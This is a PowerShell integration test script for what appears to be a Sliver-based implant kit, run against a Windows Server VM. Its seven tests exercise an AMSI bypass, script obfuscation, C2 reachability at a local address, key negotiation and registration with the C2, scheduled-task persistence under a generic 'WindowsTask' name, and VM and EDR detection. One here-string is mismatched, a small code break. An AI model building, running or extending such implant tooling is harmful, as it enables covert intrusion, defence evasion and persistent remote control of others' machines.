# Phase 7: End-to-End Integration Tests
# Run on Windows Server 2016 target VM

param(
    [string]$C2Url = "http://10.0.2.2:8080",
    [string]$OutputLog = "$env:TEMP\e2e-results.log"
)

"[*] Phase 7 E2E Tests started: $(Get-Date)" | Tee-Object -FilePath $OutputLog -Append

# Test 1: AMSI Bypass
Write-Host "[1] Testing AMSI bypass..."
try {
    . "$PSScriptRoot/../lib/amsi-bypass.ps1"
    $amsiUtilsType = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").GetType('System.Management.Automation.AmsiUtils')
    if ($amsiUtilsType.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'NonPublic,Static').GetValue($null)) {
        "[+] AMSI bypass: SUCCESS" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[-] AMSI bypass: FAILED" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] AMSI bypass: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 2: Obfuscation
Write-Host "[2] Testing obfuscation..."
try {
    . "$PSScriptRoot/../lib/obfuscation.ps1"
    $testScript = @'
$hostname = "TEST"
$url = "http://test.com"
"@
    $temp = New-TemporaryFile
    $testScript | Set-Content $temp
    $obfuscated = Obfuscate-PowerShellScript -ScriptPath $temp
    if (Test-Path $obfuscated) {
        "[+] Obfuscation: SUCCESS" | Tee-Object -FilePath $OutputLog -Append
        Remove-Item $obfuscated -Force
    }
    Remove-Item $temp -Force
} catch {
    "[-] Obfuscation: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 3: C2 Reachability
Write-Host "[3] Testing C2 reachability..."
try {
    $response = Invoke-WebRequest -Uri "$C2Url/health" -TimeoutSec 3 -UseBasicParsing -ErrorAction Stop
    if ($response.StatusCode -eq 200) {
        "[+] C2 /health: SUCCESS" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[-] C2 /health: HTTP $($response.StatusCode)" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] C2 /health: UNREACHABLE - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 4: Key Negotiation
Write-Host "[4] Testing key negotiation..."
try {
    . "$PSScriptRoot/../lib/sliver-connector-v2.ps1"
    $connector = New-Object SliverConnectorV2($C2Url, [System.Net.Dns]::GetHostName())
    if ($connector.Register()) {
        "[+] Key negotiation: SUCCESS" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[-] Key negotiation: FAILED (register returned false)" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] Key negotiation: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 5: Persistence Installation
Write-Host "[5] Testing persistence installation..."
try {
    . "$PSScriptRoot/../lib/sliver-dropper-core.ps1"
    $persistence = New-Object SchTasksPersistence
    $persistence.Install([System.Net.Dns]::GetHostName(), $C2Url)

    $taskExists = cmd /c "schtasks /query /tn `"WindowsTask*`" 2>nul | find /c `"/`" " 2>$null
    if ($taskExists -gt 1) {
        "[+] Persistence installed: SUCCESS" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[-] Persistence installed: FAILED (task not found)" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] Persistence installation: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 6: VM Detection
Write-Host "[6] Testing anti-analysis..."
try {
    . "$PSScriptRoot/../lib/anti-analysis.ps1"
    $vm = Detect-VM
    if ($vm) {
        "[+] VM detected: $vm" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[+] VM detection: OK (no VM)" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] VM detection: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Test 7: EDR Detection
Write-Host "[7] Testing EDR detection..."
try {
    . "$PSScriptRoot/../lib/edr-detect.ps1"
    $edr = Detect-EDR -Detailed
    if ($edr.Count -gt 0) {
        "[!] EDR detected: $($edr | ConvertTo-Json)" | Tee-Object -FilePath $OutputLog -Append
    } else {
        "[+] EDR detection: OK (no EDR)" | Tee-Object -FilePath $OutputLog -Append
    }
} catch {
    "[-] EDR detection: ERROR - $_" | Tee-Object -FilePath $OutputLog -Append
}

# Summary
"[*] Phase 7 E2E Tests completed: $(Get-Date)" | Tee-Object -FilePath $OutputLog -Append
Write-Host "`n[+] Results logged to: $OutputLog"
Get-Content $OutputLog | Select-Object -Last 20
